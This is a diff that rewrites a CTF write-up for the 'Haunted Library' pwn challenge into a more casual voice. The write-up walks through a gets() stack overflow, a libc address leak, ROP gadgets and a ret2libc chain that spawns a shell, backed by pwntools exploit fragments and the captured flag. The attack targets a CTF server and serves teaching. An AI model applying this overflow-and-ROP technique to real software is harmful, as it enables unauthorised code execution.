@@ -18,11 +18,8 @@ nc env02.deadface.io 7832
 
 
 
-## Initial Analysis
 
-### Binary Security Checks
-
-First, let's check what protections are enabled:
+First we should actually run checksec to see 
 
 ```bash
 $ checksec hauntedlibrary
@@ -36,14 +33,14 @@ $ checksec hauntedlibrary
     Stripped:   No
 ```
 
-**Key Observations:**
+Mhmm so  , some stuff to note from checksec is 
 -  **No Stack Canary** - Stack buffer overflows are exploitable
 -  **NX Enabled** - We can't execute shellcode on the stack (need ROP)
 -  **No PIE** - Binary addresses are predictable/static
 -  **Partial RELRO** - GOT is writable, but we'll use ROP instead
 -  **Not Stripped** - Function names are available for analysis
 
-### Running the Binary
+Enough static and lets try running the binary 
 
 ```bash
 $ ./hauntedlibrary
@@ -59,20 +56,16 @@ Welcome to the Haunted Library...
 > 
 ```
 
-The application presents a simple menu system:
-1. **Browse books** - Shows available books
-2. **Check out** - Lets us "check out" a book by name
-3. **Exit** - Exits the program
 
----
+It has a menu system where you can browse books , check out book and exit  
 
-## Reverse Engineering
 
-### Analyzing with Ghidra
+
+Since we have the static stuff out of the way , lets see thew pesudo code in ghidra and  
 
 Loading the binary into Ghidra, we identify several key functions:
 
-#### Main Function Structure
+#### Main Fun
 
 ```c
 void main(void) {
@@ -101,7 +94,7 @@ void main(void) {
 }
 ```
 
-#### The Vulnerable Function
+
 
 The `check_out()` function at `0x4013e7` contains our vulnerability:
 
@@ -111,7 +104,7 @@ void check_out(void) {
     
     puts("Which book would you like to check out?");
     printf("> ");
-    gets(book_name);  //  DANGEROUS! No bounds checking!
+    gets(book_name);  //  ! No bounds checking! ehee 
     
     if (strcmp(book_name, "BookOfTheDead") == 0) {
         book_of_the_dead();
@@ -122,11 +115,11 @@ void check_out(void) {
 }
 ```
 
-**Vulnerability:** The `gets()` function reads unlimited input into an 80-byte buffer, allowing a classic **stack buffer overflow**!
+ The `gets()` function reads unlimited input into an 80-byte buffer, allowing a classic stack overflow  
 
-#### The Hidden Function
+Also an another thing i found in ghidra was  
 
-Ghidra reveals an interesting function `book_of_the_dead()` at `0x40174f`:
+`book_of_the_dead()` at `0x40174f`:
 
 ```c
 void book_of_the_dead(void) {
@@ -135,39 +128,14 @@ void book_of_the_dead(void) {
 }
 ```
 
-**This is gold!** 💎 This function prints the actual runtime address of `puts()` from libc. This gives us:
-- A way to defeat ASLR (Address Space Layout Randomization)
-- The ability to calculate the libc base address
-- Access to any libc function (like `system()`)
+Oh we get the puts from libc , so we can bypass ASLR and contruct a rop chain and we can also get the libc base and get values of other functions , like system for example .
 
----
 
-## Exploitation Strategy
 
-Since we have:
--  Buffer overflow vulnerability
--  NX enabled (need ROP, can't use shellcode)
--  Information leak available (`book_of_the_dead`)
--  Static binary addresses (no PIE)
+So far my thought process is to - Overflow the buffer to call a leak stage (e.g. `puts(puts@got)` or `book_of_the_dead()`), return to `main`, parse the leaked `puts` to compute `libc_base`, find `system` and `"/bin/sh"` offsets, then send a second ROP payload using `pop rdi; ret` to call `system("/bin/sh")` and spawn a shell to read the flag.
 
-Our attack plan:
 
-### Stage 1: Information Leak
-1. Overflow the buffer to hijack control flow
-2. Call `book_of_the_dead()` to leak `puts()` address
-3. Return to `main()` for a second exploitation round
 
-### Stage 2: ret2libc Attack
-1. Calculate libc base address from the leak
-2. Find addresses of `system()` and `"/bin/sh"`
-3. Build ROP chain to execute `system("/bin/sh")`
-4. Get shell and read the flag!
-
----
-
-## Exploitation Details
-
-### Finding the Offset
 
 Using pwntools' `cyclic` pattern to find the exact offset to the return address:
 
@@ -196,7 +164,7 @@ gdb> x/wx $rsp
 
 **The return address is at offset 88 bytes!**
 
-### Stage 1: Leaking libc
+ALr now leats leak the libc 
 
 ```python
 from pwn import *
@@ -229,7 +197,7 @@ match = re.search(r'(0x[0-9a-fA-F]+)', leak_line)
 leak = int(match.group(1), 16)
 ```
 
-### Calculating libc Base
+LIBC base would be 
 
 ```python
 libc = ELF('./libc.so.6')
@@ -241,17 +209,11 @@ print(f"[+] Leaked puts(): {hex(leak)}")
 print(f"[+] Libc base: {hex(libc.address)}")
 ```
 
-Example output:
-```
-[+] Leaked puts(): 0x7dd673e9bc80
-[+] Libc base: 0x7dd673e19000
-```
+
+Before building our ROP chain, ill try to explain what rop gadgets we need etc and why and where to use them . 
 
 
 
-Before building our ROP chain, we need to understand how function arguments work in 64-bit systems.
-
-#### Why Do We Need RDI?
 
 In **x86-64 (64-bit) Linux**, function arguments are passed through **registers** in this specific order:
 
@@ -274,7 +236,7 @@ int system(const char *command);
 
 We want: `system("/bin/sh")`
 
-So we need to load the address of the string `"/bin/sh"` into **RDI** before calling `system()`.
+So we need to load the address of the string `"/bin/sh"` into **RDI** before calling `system()`. :)
 
 
 
@@ -292,7 +254,7 @@ We need two gadgets:
    ret        ; RIP = [stack pointer], then SP += 8
    ```
 
-#### Finding Gadgets
+Lets find using ropgadget tool 
 
 ```python
 # Using ROPgadget or ropper
@@ -308,7 +270,8 @@ pop_rdi = libc.address + 0x102dea
 ret_gadget = libc.address + 0x24578
 ```
 
-### Building the ROP Chain
+
+now thats done lets build a rop chain 
 
 ```python
 system = libc.symbols['system']
@@ -340,7 +303,7 @@ ret gadget pops once → Stack pointer: 0x7fffffffe3e0  ← 16-byte aligned!
 system() executes successfully
 ```
 
----
+
 
 ## Final pwn code :)
 
@@ -427,9 +390,9 @@ print(output.decode())
 print("="*60)
 ```
 
----
 
-## Execution Output
+
+
 
 ```bash
 $ python exploit.py
@@ -458,6 +421,4 @@ deadface{TH3_L1BR4RY_KN0W5_4LL}
 
 
 
----
 
-*This writeup is for educational purposes only. Always practice responsible disclosure and only exploit systems you have permission to test.*
